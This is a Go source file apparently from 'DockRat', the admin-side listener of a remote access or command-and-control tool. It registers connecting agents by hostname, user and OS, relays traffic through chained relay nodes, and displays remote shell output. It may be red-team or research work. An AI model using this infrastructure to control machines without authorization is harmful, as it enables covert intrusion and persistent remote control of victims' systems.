package network

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"regexp"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------- admin专用的监听函数 -------------------------
var ansiRegex = regexp.MustCompile(`\x1b\[[0-9;?]*[a-zA-Z]`)

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload protocol.HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)

		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
		case protocol.MsgShell:
			writeShellOutput(msg.Payload)
		case protocol.MsgRelayReady:
			var payload protocol.RelayReadyPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayReady decode failed: %v", err)
				return
			}
			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)

		case protocol.MsgRelayRegister:
			var payload protocol.RelayRegisterPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayRegister decode failed: %v", err)
				return
			}
			newNode := payload.Node
			newID := newNode.ID
			if _, exists := registry.Get(newID); exists {
				log.Printf("[-] Duplicate node ID %d rejected", newID)
				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
				sendAck(n.Conn, protocol.MsgRelayError, resp)
				return
			}
			registry.AddWithID(&newNode)
			registry.NodeGraph.SetParent(newID, payload.ParentID)
			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
			sendAck(n.Conn, protocol.MsgRelayAck, resp)

		case protocol.MsgRelayPacket:
			fmt.Printf("[Admin] Received relay_packet from node %d\n", n.ID)
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Printf("[-] RelayPacket decode failed: %v", err)
				return
			}

			reader := bytes.NewReader(pkt.Data)
			innerMsg, err := protocol.ReadMessage(reader)
			if err != nil {
				log.Printf("[-] Failed to decode inner message: %v", err)
				return
			}

			if pkt.DestID == -1 {
				switch innerMsg.Type {
				case protocol.MsgRelayRegister:
					var payload protocol.RelayRegisterPayload
					if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
						log.Printf("[-] RelayRegister decode failed: %v", err)
						return
					}
					newNode := payload.Node
					newID := newNode.ID
					if _, exists := registry.Get(newID); exists {
						log.Printf("[-] Duplicate node ID %d rejected", newID)
						resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
						sendAck(n.Conn, protocol.MsgRelayError, resp)
						return
					}
					registry.AddWithID(&newNode)
					registry.NodeGraph.SetParent(newID, payload.ParentID)
					log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
					resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
					sendAck(n.Conn, protocol.MsgRelayAck, resp)

				case protocol.MsgShell:
					log.Printf("[Admin] Displaying shell output (direct):")
					writeShellOutput(innerMsg.Payload)

				default:
					log.Printf("[-] Unknown message type sent to admin: %s", innerMsg.Type)
				}
				return
			}

			// relay → relay/admin 正常下发
			switch innerMsg.Type {
			case protocol.MsgResponse:
				log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
			case protocol.MsgShell:
				writeShellOutput(innerMsg.Payload)
			default:
				// 向下 relay
				parentID := registry.NodeGraph.GetParent(pkt.DestID)
				if parentID == -1 {
					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
					return
				}
				parentNode, ok := registry.Get(parentID)
				if !ok || parentNode.Conn == nil {
					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
					return
				}
				fwdMsg := protocol.Message{
					Type:    protocol.MsgRelayPacket,
					Payload: msg.Payload,
				}
				buf, err := protocol.EncodeMessage(fwdMsg)
				if err != nil {
					log.Printf("[-] Failed to encode relay forward: %v", err)
					return
				}
				_, err = parentNode.Conn.Write(buf)
				if err != nil {
					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
				}
			}
		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
		}
	}
}

func writeShellOutput(payload []byte) {
	clean := ansiRegex.ReplaceAll(payload, []byte{})

	// 过滤常见 bash 提示符前缀
	clean = bytes.ReplaceAll(clean, []byte("bash-5.2$ "), []byte(""))
	clean = bytes.ReplaceAll(clean, []byte("bash-5.1$ "), []byte(""))

	os.Stdout.Write(clean)
	os.Stdout.Sync()
}
func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
	data, _ := json.Marshal(ack)
	msg := protocol.Message{
		Type:    msgType,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(msg)
	conn.Write(buf)
}
